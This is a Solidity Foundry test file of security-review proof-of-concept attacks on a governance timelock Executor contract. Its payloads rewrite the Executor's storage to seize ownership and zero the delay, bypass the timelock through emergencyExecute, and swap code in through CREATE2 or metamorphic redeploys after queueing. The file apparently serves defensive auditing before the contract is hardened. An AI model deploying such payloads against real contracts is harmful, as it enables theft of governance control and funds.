// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// S4a WIP evidence: the review PoCs (review/poc/core/ExecutorPoC.t.sol) run against the ORIGINAL
// Executor. Every test PASSES here, i.e. every attack SUCCEEDS. The next commit hardens the Executor
// and rewrites this file so each attack is asserted to be BLOCKED.

import 'forge-std/Test.sol';
import {Executor} from '../../src/contracts/extensions/v3-config-engine/Executor.sol';
import {IEACAggregatorProxy} from '../../src/contracts/helpers/interfaces/IEACAggregatorProxy.sol';

contract Victim {
  address public admin;
  constructor(address a) {
    admin = a;
  }
  function setAdmin(address a) external {
    require(msg.sender == admin, 'not admin');
    admin = a;
  }
}

/// payload that rewrites the Executor's own storage (slot layout: 0 owner, 1 delay, 2 queued map, 3 emergencyDisabled)
contract StorageRewritePayload {
  address immutable NEW_OWNER;
  constructor(address o) {
    NEW_OWNER = o;
  }
  function execute() external {
    assembly {
      sstore(1, 0) // delay = 0
      sstore(3, 0) // emergencyDisabled = false
    }
    address o = NEW_OWNER;
    assembly {
      sstore(0, o) // owner = NEW_OWNER
    }
  }
}

contract NaivePayloadWithStorage {
  // a careless payload that declares a state variable: slot0 collides with Executor._owner
  address public lastCaller;
  function execute() external {
    lastCaller = address(0xdead);
  }
}

contract GrabAdminPayload {
  function execute() external {
    Victim(address(0x1234)).setAdmin(address(0xBEEF));
  }
}

contract RevertingPayload {
  function execute() external pure {
    revert('99'); // Aave-style error code
  }
}

contract Create2Deployer {
  function deploy(bytes32 salt, bytes memory code) external returns (address a) {
    assembly {
      a := create2(0, add(code, 0x20), mload(code), salt)
    }
    require(a != address(0));
  }
}

contract ExecutorPoC is Test {
  Executor ex;
  address owner = address(this);

  function setUp() public {
    ex = new Executor(2 days);
  }

  function test_emergencyExecute_bypassesTimelock_byDefault() public {
    Victim v = new Victim(address(ex));
    vm.etch(address(0x1234), address(v).code);
    vm.store(address(0x1234), bytes32(0), bytes32(uint256(uint160(address(ex)))));
    GrabAdminPayload p = new GrabAdminPayload();
    assertFalse(ex.emergencyDisabled());
    ex.emergencyExecute(address(p)); // same block, no queue
    assertEq(Victim(address(0x1234)).admin(), address(0xBEEF));
  }

  function test_disableEmergency_isNotPermanent_and_delayCanBeZeroed() public {
    ex.disableEmergency();
    assertTrue(ex.emergencyDisabled());
    StorageRewritePayload p = new StorageRewritePayload(address(0xA11CE));
    uint256 eta = block.timestamp + ex.delay();
    ex.queueTransaction(address(p));
    vm.warp(eta);
    ex.execute(address(p), eta);
    assertFalse(ex.emergencyDisabled(), 'emergency re-enabled');
    assertEq(ex.delay(), 0, 'delay below MINIMUM_DELAY');
    assertEq(ex.owner(), address(0xA11CE), 'owner replaced w/o event');
    // new owner can now act instantly through either path
    address noop = address(new GrabAdminPayloadNoop());
    vm.prank(address(0xA11CE));
    ex.emergencyExecute(noop);
  }

  function test_naivePayloadStorage_clobbersOwner() public {
    NaivePayloadWithStorage p = new NaivePayloadWithStorage();
    ex.emergencyExecute(address(p));
    assertEq(ex.owner(), address(0xdead));
  }

  function test_queueCodelessAddress_thenDeployLater() public {
    Create2Deployer d = new Create2Deployer();
    bytes memory code = type(GrabAdminPayloadNoop).creationCode;
    address predicted = vm.computeCreate2Address(bytes32(0), keccak256(code), address(d));
    assertEq(predicted.code.length, 0);
    uint256 eta = block.timestamp + ex.delay();
    ex.queueTransaction(predicted); // nothing to review at queue time
    vm.warp(eta);
    d.deploy(bytes32(0), code); // code chosen after the delay elapsed
    ex.execute(predicted, eta);
  }

  function test_execute_codelessTarget_silentSuccess() public {
    uint256 eta = block.timestamp + ex.delay();
    ex.queueTransaction(address(0xC0FFEE));
    vm.warp(eta);
    ex.execute(address(0xC0FFEE), eta); // no revert, nothing executed
  }

  function test_revertReason_isMangled() public {
    RevertingPayload p = new RevertingPayload();
    try ex.emergencyExecute(address(p)) {
      fail();
    } catch Error(string memory reason) {
      // reason is the raw ABI-encoded Error(string) blob, not '99'
      assertTrue(keccak256(bytes(reason)) != keccak256(bytes('99')));
      assertEq(bytes(reason).length, 100);
    }
  }

  function test_setDelay_notTimelocked() public {
    ex.setDelay(1 days); // owner shortens from 2d to 1d instantly
    assertEq(ex.delay(), 1 days);
  }

  function test_uiPoolDataProvider_addressOne_aggregatorReverts() public {
    vm.expectRevert();
    this.readLatest(address(1));
  }

  function readLatest(address a) external view returns (int256) {
    return IEACAggregatorProxy(a).latestAnswer();
  }
}

contract GrabAdminPayloadNoop {
  function execute() external {}
}

/// R2-3: a legitimate-looking stateful payload (Codex round 2): `executions` collides with slot 0 (owner)
contract CounterPayload {
  uint256 public executions;
  function execute() external {
    executions++;
  }
}

contract BenignPayload {
  event Ran();
  function execute() external {
    emit Ran();
  }
}

/// Extra PoCs (S4a): queued stateful payload clobbers the owner; target code swapped between queue and execute
contract ExecutorPoCExtra is Test {
  Executor ex;

  function setUp() public {
    ex = new Executor(2 days);
  }

  function test_queuedStatefulPayload_clobbersOwner() public {
    CounterPayload p = new CounterPayload();
    uint256 eta = block.timestamp + ex.delay();
    ex.queueTransaction(address(p));
    vm.warp(eta);
    ex.execute(address(p), eta);
    // owner slot was incremented: owner is now address(this)+1, governance is lost
    assertEq(ex.owner(), address(uint160(address(this)) + 1));
  }

  function test_targetCodeSwappedAfterQueue_executesNewCode() public {
    BenignPayload p = new BenignPayload();
    uint256 eta = block.timestamp + ex.delay();
    ex.queueTransaction(address(p));
    vm.warp(eta);
    // code at the reviewed address is replaced after the delay (metamorphic redeploy)
    vm.etch(address(p), address(new StorageRewritePayload(address(0xA11CE))).code);
    ex.execute(address(p), eta);
    assertEq(ex.owner(), address(0xA11CE));
  }
}
